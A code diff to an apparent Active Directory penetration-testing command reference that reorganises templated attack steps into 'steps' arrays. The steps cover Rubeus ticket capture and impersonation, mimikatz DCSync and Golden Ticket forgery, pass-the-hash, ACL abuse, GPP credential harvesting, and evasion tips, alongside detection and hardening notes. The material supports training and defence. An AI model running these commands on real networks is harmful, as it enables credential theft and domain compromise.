@@ -132,18 +132,6 @@ const COMMAND_DATA = {
         {
           "label": "List all GPOs and their linked OUs",
           "command": "Get-GPO -All | Select DisplayName, Id, GpoStatus"
-        },
-        {
-          "label": "Check Event 5136 for GPO modifications",
-          "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=5136} | Where-Object { $_.Properties[8].Value -match 'CN=Policies' } | Format-List"
-        },
-        {
-          "label": "Monitor honeypot GPO and disable modifying account",
-          "command": "$Logs = Get-WinEvent -FilterHashtable @{LogName='Security';Id=5136;StartTime=(Get-Date).AddSeconds(-300)} -ErrorAction SilentlyContinue | Where-Object {$_.Properties[8].Value -match \"CN={<GPO_GUID>},CN=POLICIES\"}; if($Logs){ foreach($log in $Logs){ Disable-ADAccount -Identity $log.Properties[3].Value } }"
-        },
-        {
-          "label": "Check Event 4725 — user account disabled (honeypot response)",
-          "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4725} | Select -First 10 | Format-List"
         }
       ],
       "references": [
@@ -183,7 +171,29 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Finding GPOs with weak ACEs:\nGet-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs |\n    Where-Object {\n        $_.ActiveDirectoryRights -match 'CreateChild|WriteProperty|GenericAll' -and\n        $_.IdentityReference -notmatch 'Domain Admins|SYSTEM|Enterprise Admins'\n    } | Select-Object ObjectDN, IdentityReference, ActiveDirectoryRights",
         "secure_config": "# Remove edit rights from non-admin accounts:\n# Group Policy Management Console (GPMC):\n# GPO -> Delegation tab -> Remove non-admin entries or change to Read-only\n\n# PowerShell — enumerate and review:\nGet-GPPermissions -Guid <gpo-guid> -All\n# Remove write access:\nSet-GPPermissions -Guid <gpo-guid> -TargetName 'helpdesk' \\\n    -TargetType Group -PermissionLevel GpoRead\n\n# Alert on GPO changes:\n# Event 5136 (Directory Service Object Modified) with objectClass = groupPolicyContainer\n# Event 4657 (Registry value modified) after GPO applies\n# Microsoft Defender for Identity: 'Suspicious GPO modification' alert",
         "evasion": "Revert the GPO change after it executes; scope the malicious setting to one OU; time it around a normal gpupdate window."
-      }
+      },
+      "steps": [
+        {
+          "label": "Enumerate GPO write ACLs (PowerView)",
+          "command": "Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericWrite|WriteDACL|WriteOwner' }"
+        },
+        {
+          "label": "List all GPOs and their linked OUs",
+          "command": "Get-GPO -All | Select DisplayName, Id, GpoStatus"
+        },
+        {
+          "label": "Check Event 5136 for GPO modifications",
+          "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=5136} | Where-Object { $_.Properties[8].Value -match 'CN=Policies' } | Format-List"
+        },
+        {
+          "label": "Monitor honeypot GPO and disable modifying account",
+          "command": "$Logs = Get-WinEvent -FilterHashtable @{LogName='Security';Id=5136;StartTime=(Get-Date).AddSeconds(-300)} -ErrorAction SilentlyContinue | Where-Object {$_.Properties[8].Value -match \"CN={<GPO_GUID>},CN=POLICIES\"}; if($Logs){ foreach($log in $Logs){ Disable-ADAccount -Identity $log.Properties[3].Value } }"
+        },
+        {
+          "label": "Check Event 4725 — user account disabled (honeypot response)",
+          "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4725} | Select -First 10 | Format-List"
+        }
+      ]
     },
     {
       "id": "crtp-race-backdoors",
@@ -9014,26 +9024,6 @@ const COMMAND_DATA = {
         {
           "label": "Enumerate via Get-ADComputer (built-in)",
           "command": "Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select Name, DNSHostName"
-        },
-        {
-          "label": "Rubeus monitor mode — capture TGTs as they arrive",
-          "command": ".\\Rubeus.exe monitor /interval:1 /nowrap"
-        },
-        {
-          "label": "Coercer — force DC to authenticate to unconstrained server",
-          "command": "python3 Coercer.py -u <USER> -p <PASSWORD> -d <DOMAIN> -l <UNCONSTRAINED_SERVER_FQDN> -t <DC_FQDN>"
-        },
-        {
-          "label": "Inject captured DC TGT",
-          "command": ".\\Rubeus.exe ptt /ticket:<BASE64_TICKET>"
-        },
-        {
-          "label": "Verify injected DC ticket",
-          "command": "klist"
-        },
-        {
-          "label": "DCSync using injected DC TGT",
-          "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:Administrator"
         }
       ],
       "references": [
@@ -9075,7 +9065,37 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Finding unconstrained delegation hosts:\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation |\n    Select-Object Name, TrustedForDelegation\n# Legitimate: Domain Controllers\n# NOT legitimate: fileserver01, webserver02, etc.\n\n# Service account with unconstrained delegation:\nGet-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation",
         "secure_config": "# Remove unconstrained delegation from all non-DC hosts:\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} |\n    Where-Object {$_.Name -notmatch 'DC'} |\n    Set-ADComputer -TrustedForDelegation $false\n\n# Use constrained delegation instead (specific services only):\nSet-ADComputer fileserver01 -TrustedForDelegation $false\n# Then configure resource-based constrained delegation:\nSet-ADComputer fileserver01 -PrincipalsAllowedToDelegateToAccount webserver01\n\n# Protected Users group — members cannot be delegated:\nAdd-ADGroupMember 'Protected Users' -Members 'Domain Admins'\n\n# Enable Kerberos Armoring (FAST) to prevent TGT forwarding abuse",
         "evasion": "Fire the coercion briefly to grab one authentication, then stop; choose whichever coercion protocol (printerbug/DFSCoerce/PetitPotam) is unpatched to avoid failed-attempt noise."
-      }
+      },
+      "steps": [
+        {
+          "label": "Find computers with Unconstrained Delegation (PowerView)",
+          "command": "Get-NetComputer -Unconstrained | select samaccountname, dnshostname"
+        },
+        {
+          "label": "Enumerate via Get-ADComputer (built-in)",
+          "command": "Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select Name, DNSHostName"
+        },
+        {
+          "label": "Rubeus monitor mode — capture TGTs as they arrive",
+          "command": ".\\Rubeus.exe monitor /interval:1 /nowrap"
+        },
+        {
+          "label": "Coercer — force DC to authenticate to unconstrained server",
+          "command": "python3 Coercer.py -u <USER> -p <PASSWORD> -d <DOMAIN> -l <UNCONSTRAINED_SERVER_FQDN> -t <DC_FQDN>"
+        },
+        {
+          "label": "Inject captured DC TGT",
+          "command": ".\\Rubeus.exe ptt /ticket:<BASE64_TICKET>"
+        },
+        {
+          "label": "Verify injected DC ticket",
+          "command": "klist"
+        },
+        {
+          "label": "DCSync using injected DC TGT",
+          "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:Administrator"
+        }
+      ]
     },
     {
       "id": "coldfusion-directory-traversal",
@@ -12982,18 +13002,6 @@ const COMMAND_DATA = {
         {
           "label": "Search .ini files for 'pass' (filename only)",
           "command": "findstr /m /s /i \"pass\" *.ini"
-        },
-        {
-          "label": "Search .config files for 'pw' (show matching line)",
-          "command": "findstr /s /i \"pw\" *.config"
-        },
-        {
-          "label": "Search .ps1 scripts for domain name (catches net use / runas creds)",
-          "command": "findstr /s /i \"<DOMAIN_NETBIOS>\" *.ps1"
-        },
-        {
-          "label": "Connect to hidden share via smbclient (from Kali)",
-          "command": "smbclient \\\\<TARGET_IP>\\<SHARE_NAME> -U <DOMAIN>/<USERNAME>%<PASSWORD>"
         }
       ],
       "references": [
@@ -13034,7 +13042,29 @@ const COMMAND_DATA = {
         "vulnerable_config": "# SMB share readable by all domain users:\n# \\\\fileserver\\IT\\scripts\\deploy.bat\n# Contents:\nnet use Z: \\\\server\\share /user:CORP\\svc_deploy P@ssw0rd123  # cleartext password\n\n# SYSVOL scripts with embedded credentials:\n# \\\\corp.local\\SYSVOL\\corp.local\\scripts\\logon.bat\nnet user administrator TempAdminPass2023! /domain  # domain admin password!\n\n# Config files:\n# \\\\server\\configs\\web.config: connectionString containing DB password",
         "secure_config": "# 1. Audit shares for credentials:\n# PowerShell — search for password strings in SMB shares:\nGet-ChildItem '\\\\corp.local\\SYSVOL' -Recurse -Include '*.bat','*.ps1','*.xml','*.config' |\n    Select-String -Pattern 'password|passwd|pwd|credentials|secret' |\n    Select-Object Path, LineNumber, Line\n\n# 2. Replace hardcoded credentials with proper secrets management:\n# Use gMSA for service accounts (no stored password needed)\n# Use Windows Credential Manager / DPAPI for interactive scripts\n# Use a PAM solution (CyberArk, HashiCorp Vault) for privileged credentials\n\n# 3. Restrict share permissions:\n# Remove 'Everyone: Read' from administrative shares\n# Use security groups with need-to-know membership\n# Enable access-based enumeration (users only see shares they can access)\n\n# 4. Monitor with DLP or file activity monitoring:\n# Alert on access to files containing password keywords",
         "evasion": "Access the exposed secret directly and avoid re-triggering the exposure; pull the file over an existing channel."
-      }
+      },
+      "steps": [
+        {
+          "label": "Enumerate domain shares (PowerView)",
+          "command": "Invoke-ShareFinder -domain <DOMAIN> -ExcludeStandard -CheckShareAccess"
+        },
+        {
+          "label": "Search .ini files for 'pass' (filename only)",
+          "command": "findstr /m /s /i \"pass\" *.ini"
+        },
+        {
+          "label": "Search .config files for 'pw' (show matching line)",
+          "command": "findstr /s /i \"pw\" *.config"
+        },
+        {
+          "label": "Search .ps1 scripts for domain name (catches net use / runas creds)",
+          "command": "findstr /s /i \"<DOMAIN_NETBIOS>\" *.ps1"
+        },
+        {
+          "label": "Connect to hidden share via smbclient (from Kali)",
+          "command": "smbclient \\\\<TARGET_IP>\\<SHARE_NAME> -U <DOMAIN>/<USERNAME>%<PASSWORD>"
+        }
+      ]
     },
     {
       "type": "command",
@@ -13853,18 +13883,6 @@ const COMMAND_DATA = {
         {
           "label": "DCSync — dump specific user hash",
           "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:Administrator"
-        },
-        {
-          "label": "DCSync — dump krbtgt hash (Golden Ticket prep)",
-          "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt"
-        },
-        {
-          "label": "DCSync — dump all hashes (very loud)",
-          "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /all"
-        },
-        {
-          "label": "Pass-the-Hash with obtained NTLM (Kali)",
-          "command": "impacket-wmiexec <DOMAIN>/Administrator@<DC_IP> -hashes :<NTLM_HASH>"
         }
       ],
       "references": [
@@ -13904,7 +13922,29 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Checking who has dangerous replication rights on the domain object:\n# (via BloodHound 'DCSync' edge, or directly):\nGet-ObjectAcl -DistinguishedName 'DC=corp,DC=local' -ResolveGUIDs |\n  Where-Object {$_.ActiveDirectoryRights -match 'DS-Replication-Get-Changes'} |\n  Select-Object IdentityReference, ActiveDirectoryRights\n\n# Dangerous output:\n# IdentityReference            ActiveDirectoryRights\n# CORP\\svc_monitoring          DS-Replication-Get-Changes-All\n# CORP\\john.doe                DS-Replication-Get-Changes\n\n# Legitimate holders: CORP\\Domain Controllers, CORP\\Enterprise Controllers, CORP\\ENTERPRISE DOMAIN CONTROLLERS",
         "secure_config": "# Remove DCSync rights from non-DC accounts:\n# Using PowerView:\n$acl = Get-Acl 'AD:\\DC=corp,DC=local'\n$ace = $acl.Access | Where-Object {\n    $_.IdentityReference -match 'svc_monitoring' -and\n    $_.ObjectType -eq 'DS-Replication-Get-Changes-All'\n}\n$acl.RemoveAccessRule($ace)\nSet-Acl 'AD:\\DC=corp,DC=local' $acl\n\n# Alert on all DCSync-capable accounts:\n# Microsoft Defender for Identity detects DCSync automatically (alert: 'DCSync attack')\n# SIEM: Watch for 4662 events with replication rights GUIDs:\n# {19195a5b-6da0-11d0-afd3-00c04fd930c9} = DS-Replication-Get-Changes\n# {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} = DS-Replication-Get-Changes-All",
         "evasion": "Run the escalation in-memory where possible, restore any modified config/ACL, and remove dropped payloads after obtaining the higher context."
-      }
+      },
+      "steps": [
+        {
+          "label": "Run shell as different user (runas)",
+          "command": "runas /user:<DOMAIN>\\<USERNAME> cmd.exe"
+        },
+        {
+          "label": "DCSync — dump specific user hash",
+          "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:Administrator"
+        },
+        {
+          "label": "DCSync — dump krbtgt hash (Golden Ticket prep)",
+          "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt"
+        },
+        {
+          "label": "DCSync — dump all hashes (very loud)",
+          "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /all"
+        },
+        {
+          "label": "Pass-the-Hash with obtained NTLM (Kali)",
+          "command": "impacket-wmiexec <DOMAIN>/Administrator@<DC_IP> -hashes :<NTLM_HASH>"
+        }
+      ]
     },
     {
       "id": "cdsa-m10-debugging-x64dbg",
@@ -24017,10 +24057,6 @@ const COMMAND_DATA = {
         {
           "label": "Search for GPP XML files in SYSVOL manually",
           "command": "findstr /s /i \"cpassword\" \\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\*.xml"
-        },
-        {
-          "label": "Get-WinEvent to monitor 4663 (file access) on DC",
-          "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4663} | Where-Object {$_.Message -like '*Groups.xml*'} | Format-List"
         }
       ],
       "references": [
@@ -24059,7 +24095,21 @@ const COMMAND_DATA = {
         "vulnerable_config": "# SYSVOL Group Policy file containing encrypted password:\n# Path: \\\\corp.local\\SYSVOL\\corp.local\\Policies\\{GUID}\\Machine\\Preferences\\Groups\\Groups.xml\n# Content:\n# <Properties action='U' userName='Administrator' cpassword='edBSHOwhZLTjt...' />\n# The cpassword value is AES-256 encrypted with the static key Microsoft published:\n# Key: 4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8 f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b\n# gpp-decrypt or Get-GPPPassword decrypts it instantly",
         "secure_config": "# 1. Apply MS14-025 (KB2962486) — blocks new GPP passwords from being created\n#    (already applied if any patch from 2014+ is installed)\n\n# 2. Find and delete all existing cpassword entries in SYSVOL:\n# PowerShell — find all GPP files with cpassword:\nGet-ChildItem -Path '\\\\corp.local\\SYSVOL' -Recurse -Include '*.xml' |\n    Select-String -Pattern 'cpassword' | Select-Object Path\n# Then delete or edit those files to remove the cpassword attribute\n\n# 3. Rotate any passwords that were stored in GPP immediately\n# (assume all were read by every domain user since GPP file creation)\n\n# 4. Use LAPS instead of GPP for local admin passwords:\n# LAPS stores unique per-machine passwords in a protected AD attribute\n# Only members of a specific group can read the LAPS attribute",
         "evasion": "Access the exposed secret directly and avoid re-triggering the exposure; pull the file over an existing channel."
-      }
+      },
+      "steps": [
+        {
+          "label": "Import and run Get-GPPPassword (PowerSploit)",
+          "command": "Import-Module .\\Get-GPPPassword.ps1; Get-GPPPassword"
+        },
+        {
+          "label": "Search for GPP XML files in SYSVOL manually",
+          "command": "findstr /s /i \"cpassword\" \\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\*.xml"
+        },
+        {
+          "label": "Get-WinEvent to monitor 4663 (file access) on DC",
+          "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4663} | Where-Object {$_.Message -like '*Groups.xml*'} | Format-List"
+        }
+      ]
     },
     {
       "id": "ad-gpp-decrypt",
@@ -32340,26 +32390,6 @@ const COMMAND_DATA = {
         {
           "label": "Convert plaintext password to NTLM hash",
           "command": ".\\Rubeus.exe hash /password:<PASSWORD>"
-        },
-        {
-          "label": "S4U — impersonate Administrator via constrained delegation",
-          "command": ".\\Rubeus.exe s4u /user:<DELEGATE_USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /impersonateuser:Administrator /msdsspn:\"http/<DC_HOSTNAME>\" /dc:<DC_FQDN> /ptt"
-        },
-        {
-          "label": "S4U with alternate service protocols",
-          "command": ".\\Rubeus.exe s4u /user:<DELEGATE_USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /impersonateuser:Administrator /msdsspn:\"http/<DC_HOSTNAME>\" /altservice:ldap,cifs,host /dc:<DC_FQDN> /ptt"
-        },
-        {
-          "label": "Verify injected ticket",
-          "command": "klist"
-        },
-        {
-          "label": "Connect to DC via WinRM using injected ticket",
-          "command": "Enter-PSSession <DC_HOSTNAME>"
-        },
-        {
-          "label": "Purge tickets and retry if connection fails",
-          "command": "klist purge"
         }
       ],
       "references": [
@@ -32405,6 +32435,36 @@ const COMMAND_DATA = {
           "label": "Impacket getST",
           "command": "getST.py -spn <spn> -impersonate administrator -dc-ip <dc_ip> <domain>/<user>:<password>"
         }
+      ],
+      "steps": [
+        {
+          "label": "Find accounts trusted for constrained delegation (PowerView)",
+          "command": "Get-NetUser -TrustedToAuth"
+        },
+        {
+          "label": "Convert plaintext password to NTLM hash",
+          "command": ".\\Rubeus.exe hash /password:<PASSWORD>"
+        },
+        {
+          "label": "S4U — impersonate Administrator via constrained delegation",
+          "command": ".\\Rubeus.exe s4u /user:<DELEGATE_USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /impersonateuser:Administrator /msdsspn:\"http/<DC_HOSTNAME>\" /dc:<DC_FQDN> /ptt"
+        },
+        {
+          "label": "S4U with alternate service protocols",
+          "command": ".\\Rubeus.exe s4u /user:<DELEGATE_USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /impersonateuser:Administrator /msdsspn:\"http/<DC_HOSTNAME>\" /altservice:ldap,cifs,host /dc:<DC_FQDN> /ptt"
+        },
+        {
+          "label": "Verify injected ticket",
+          "command": "klist"
+        },
+        {
+          "label": "Connect to DC via WinRM using injected ticket",
+          "command": "Enter-PSSession <DC_HOSTNAME>"
+        },
+        {
+          "label": "Purge tickets and retry if connection fails",
+          "command": "klist purge"
+        }
       ]
     },
     {
@@ -32443,22 +32503,6 @@ const COMMAND_DATA = {
         {
           "label": "Get krbtgt NTLM hash via DCSync",
           "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt"
-        },
-        {
-          "label": "Forge Golden Ticket with realistic lifetime and inject (ptt)",
-          "command": "mimikatz # kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<KRBTGT_NTLM> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt"
-        },
-        {
-          "label": "Verify ticket in current session",
-          "command": "klist"
-        },
-        {
-          "label": "Test ticket — list DC C$ share",
-          "command": "dir \\\\<DC_HOSTNAME>\\c$"
-        },
-        {
-          "label": "AES256 Golden Ticket (quieter alternative)",
-          "command": "mimikatz # kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES256> /user:Administrator /id:500 /ptt"
         }
       ],
       "references": [
@@ -32498,7 +32542,33 @@ const COMMAND_DATA = {
         "misconfiguration": "The krbtgt account password has never been rotated (or rotated only once). The krbtgt NTLM hash is the signing key for all Kerberos TGTs in the domain — if an attacker obtains it, they can forge unlimited TGTs for any user with any group membership, valid for any lifetime, without triggering account lockout. Most domains have a krbtgt password set at domain creation and never changed.",
         "vulnerable_config": "# Check krbtgt password age (should be < 180 days ideally):\nGet-ADUser krbtgt -Properties PasswordLastSet | Select-Object PasswordLastSet\n# PasswordLastSet: 2018-03-01  <-- 6+ years, never rotated\n\n# Confirming krbtgt hash is extractable after DCSync:\n# mimikatz: lsadump::dcsync /domain:corp.local /user:krbtgt\n# => NTLM: <32-char hex hash>\n# This hash is now usable for arbitrary TGT forgery",
         "secure_config": "# Reset krbtgt password TWICE (Kerberos uses prev password for 10 min tolerance):\n# Step 1 — first reset:\nSet-ADAccountPassword -Identity krbtgt -NewPassword \\\n    (ConvertTo-SecureString (New-Guid).ToString() -AsPlainText -Force)\n# Wait 10+ hours to allow replication + ticket expiry\n# Step 2 — second reset (invalidates previous key):\nSet-ADAccountPassword -Identity krbtgt -NewPassword \\\n    (ConvertTo-SecureString (New-Guid).ToString() -AsPlainText -Force)\n\n# Microsoft script for safe krbtgt reset:\n# https://github.com/microsoft/New-KrbtgtKeys.ps1\n\n# Detection of golden tickets:\n# Event 4769 with ticket encryption NOT matching domain default\n# TGT lifetime > MaxTicketAge policy\n# Account SID in PAC not matching DC's AD lookup (Defender for Identity detects this)"
-      }
+      },
+      "steps": [
+        {
+          "label": "Get Domain SID (PowerView)",
+          "command": ". .\\PowerView.ps1; Get-DomainSID"
+        },
+        {
+          "label": "Get krbtgt NTLM hash via DCSync",
+          "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt"
+        },
+        {
+          "label": "Forge Golden Ticket with realistic lifetime and inject (ptt)",
+          "command": "mimikatz # kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<KRBTGT_NTLM> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt"
+        },
+        {
+          "label": "Verify ticket in current session",
+          "command": "klist"
+        },
+        {
+          "label": "Test ticket — list DC C$ share",
+          "command": "dir \\\\<DC_HOSTNAME>\\c$"
+        },
+        {
+          "label": "AES256 Golden Ticket (quieter alternative)",
+          "command": "mimikatz # kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES256> /user:Administrator /id:500 /ptt"
+        }
+      ]
     },
     {
       "id": "kerbrute-userenum",
@@ -49479,26 +49549,6 @@ const COMMAND_DATA = {
         {
           "label": "Find all ACEs with dangerous rights (PowerView)",
           "command": "Get-DomainObjectAcl -ResolveGUIDs -IdentityFilter * | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL|WriteOwner|ForceChangePassword' }"
-        },
-        {
-          "label": "Abuse GenericAll — reset user password",
-          "command": "Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString '<NEW_PASS>' -AsPlainText -Force)"
-        },
-        {
-          "label": "Abuse GenericAll on group — add self as member",
-          "command": "Add-DomainGroupMember -Identity '<GROUP_NAME>' -Members '<YOUR_USER>'"
-        },
-        {
-          "label": "Grant DCSync rights via WriteDACL on domain object",
-          "command": "Add-DomainObjectAcl -TargetIdentity <DOMAIN> -PrincipalIdentity <YOUR_USER> -Rights DCSync"
-        },
-        {
-          "label": "Monitor Event 4738 — user account changed",
-          "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4738} | Select -First 20 | Format-List"
-        },
-        {
-          "label": "Monitor Event 4724 — password reset attempt",
-          "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4724} | Select -First 10 | Format-List"
         }
       ],
       "references": [
@@ -49543,7 +49593,37 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Finding objects where Domain Users have dangerous rights:\nGet-DomainObjectAcl -ResolveGUIDs |\n    Where-Object {\n        $_.IdentityReference -eq 'CORP\\Domain Users' -and\n        $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL|WriteOwner'\n    }\n\n# Or via BloodHound:\n# 'Shortest Paths to Domain Admins from Domain Users' query\n# Shows every ACE path from low-privilege to DA",
         "secure_config": "# Remove dangerous ACEs using PowerView:\nRemove-DomainObjectAcl -TargetIdentity 'Domain Admins' \\\n    -PrincipalIdentity 'Domain Users' -Rights GenericWrite\n\n# Quarterly ACL audit script:\nGet-DomainObjectAcl -ResolveGUIDs | Where-Object {\n    $_.ActiveDirectoryRights -match 'GenericAll|WriteDACL|WriteOwner' -and\n    $_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM'\n} | Export-Csv acl_audit_$(Get-Date -f yyyyMMdd).csv\n\n# Enable AD Recycle Bin and Protected Users group\n# Use Tiered Administration model to limit blast radius of any single compromise\n# Enable MDI (Microsoft Defender for Identity) — detects ACL abuse chains",
         "evasion": "Make the DACL/attribute change, use it, then REVERT it (remove the added SPN/rights) to erase the persistence artifact; a single scoped edit is low-signal without object auditing."
-      }
+      },
+      "steps": [
+        {
+          "label": "Run SharpHound — collect all AD data",
+          "command": ".\\SharpHound.exe -c All --zipfilename bh_output"
+        },
+        {
+          "label": "Find all ACEs with dangerous rights (PowerView)",
+          "command": "Get-DomainObjectAcl -ResolveGUIDs -IdentityFilter * | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL|WriteOwner|ForceChangePassword' }"
+        },
+        {
+          "label": "Abuse GenericAll — reset user password",
+          "command": "Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString '<NEW_PASS>' -AsPlainText -Force)"
+        },
+        {
+          "label": "Abuse GenericAll on group — add self as member",
+          "command": "Add-DomainGroupMember -Identity '<GROUP_NAME>' -Members '<YOUR_USER>'"
+        },
+        {
+          "label": "Grant DCSync rights via WriteDACL on domain object",
+          "command": "Add-DomainObjectAcl -TargetIdentity <DOMAIN> -PrincipalIdentity <YOUR_USER> -Rights DCSync"
+        },
+        {
+          "label": "Monitor Event 4738 — user account changed",
+          "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4738} | Select -First 20 | Format-List"
+        },
+        {
+          "label": "Monitor Event 4724 — password reset attempt",
+          "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4724} | Select -First 10 | Format-List"
+        }
+      ]
     },
     {
       "id": "office-macro-payload",
@@ -50397,21 +50477,22 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Adversaries upload web shell files (PHP, JSP, ASP scripts) to web server directories to gain persistent server-side code execution via HTTP requests. Once planted, the web shell persists across reboots and allows arbitrary command execution under the web server's account — providing a covert, browser-accessible backdoor that blends with legitimate web traffic.",
-        "prerequisites": "Valid Oracle database credentials with sufficient privileges (e.g. to use UTL_FILE or DBMS procedures).",
-        "impact": "A web shell or arbitrary file written to the server filesystem, yielding server-side code execution.",
-        "detection": "Monitor for unexpected file creation in web directories (e.g., /var/www/html) followed by the web server process (Apache, nginx, IIS) spawning command shells or script interpreters. File creation of unauthorized script files (.php, .sh, .asp) in web directories is a primary indicator.",
-        "artifacts": "A new file on the server; Oracle audit records of UTL_FILE / procedure execution; the web server spawning shell children if the file is a web shell.",
-        "prevention": "Consider disabling dangerous web server functions like PHP's eval() that can be abused to execute web shells. Enforce least privilege so that only authorized accounts can write to web directories. Audit web directory permissions and remove write access for the web server process itself.",
-        "evasion": "Write a minimal, obfuscated web shell rather than a large payload, use the database's own file-write primitives (living off the DB) instead of an external transfer, and remove the uploaded file once execution is achieved to limit forensic traces.",
+        "why_it_works": "Oracle's UTL_FILE PL/SQL package lets a database session read and write files on the DATABASE SERVER's filesystem, in any directory the instance is allowed to use (the legacy utl_file_dir parameter, or a DIRECTORY object). ODAT's utlfile module drives this over the TNS listener: with an account that can execute UTL_FILE (frequently sysdba in the labs, or a user granted EXECUTE on SYS.UTL_FILE plus a writable directory), it writes an attacker-supplied file to an arbitrary server path. The web application is not involved - the file lands directly on the DB host's disk. If that path is a web root or a startup/cron location, the write becomes server-side code execution.",
+        "prerequisites": "Network access to the Oracle TNS listener (default 1521). Valid Oracle credentials able to execute UTL_FILE and write to a target directory - commonly a sysdba account, or any account granted EXECUTE on SYS.UTL_FILE plus a writable DIRECTORY / utl_file_dir path. ODAT installed.",
+        "impact": "Arbitrary file write on the Oracle server filesystem under the Oracle service account. Planting a web shell in a web root, an SSH authorized_keys entry, or a scheduled job yields code execution / persistence on the database host. T1105 Ingress Tool Transfer, and T1505.003 when the written file is a web shell.",
+        "detection": "Oracle auditing of UTL_FILE execution and file operations (AUDIT EXECUTE ON UTL_FILE / unified auditing). Unexpected new files in web, cron, or startup directories owned by the Oracle OS account - especially script files (.php/.jsp/.sh) that are then executed. Listener log showing ODAT-style connections and sysdba logons from unusual sources. If a web shell is planted, the web server later spawning shell/interpreter children.",
+        "artifacts": "Oracle audit records of UTL_FILE FOPEN/PUT_RAW; a new file on the DB host filesystem; listener.log entries for the attacker session; web server spawning shell children if the file is a web shell.",
+        "prevention": "Least privilege on database accounts (application accounts must not be sysdba/DBA). Revoke EXECUTE on UTL_FILE from PUBLIC. Eliminate utl_file_dir wildcards and scope DIRECTORY objects tightly, never to a web root. Run Oracle as a low-privileged OS user. Restrict the TNS listener to known hosts (valid node checking) and patch Oracle. Monitor file writes in sensitive directories.",
+        "evasion": "Write directly with the database's own UTL_FILE primitive (living off the DB) instead of an external transfer; use a minimal/obfuscated payload; remove the written file once execution is achieved to limit forensic traces.",
         "sources": [
           "MITRE T1505.003",
-          "MITRE T1105"
+          "MITRE T1105",
+          "Oracle UTL_FILE / ODAT documentation"
         ],
-        "misconfiguration": "The application allows file uploads but validates only the filename extension or MIME type on the client side (or uses a blocklist instead of allowlist). An attacker can bypass extension filters by double extensions (.php.jpg), null bytes, or case manipulation, and upload webshells that execute server-side code. The upload directory may also be within the web root and executable by the web server.",
-        "vulnerable_config": "# PHP — blocklist validation (easily bypassed):\n$blocked = ['php', 'php3', 'php4', 'phtml'];\n$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);\nif (in_array(strtolower($ext), $blocked)) {\n    die('File type not allowed');\n}\nmove_uploaded_file($_FILES['file']['tmp_name'], '/var/www/html/uploads/' . $_FILES['file']['name']);\n# Bypass: upload shell.php5, shell.pHp, shell.php.jpg, shell.php%00.jpg\n# File lands in web root -> execute as PHP",
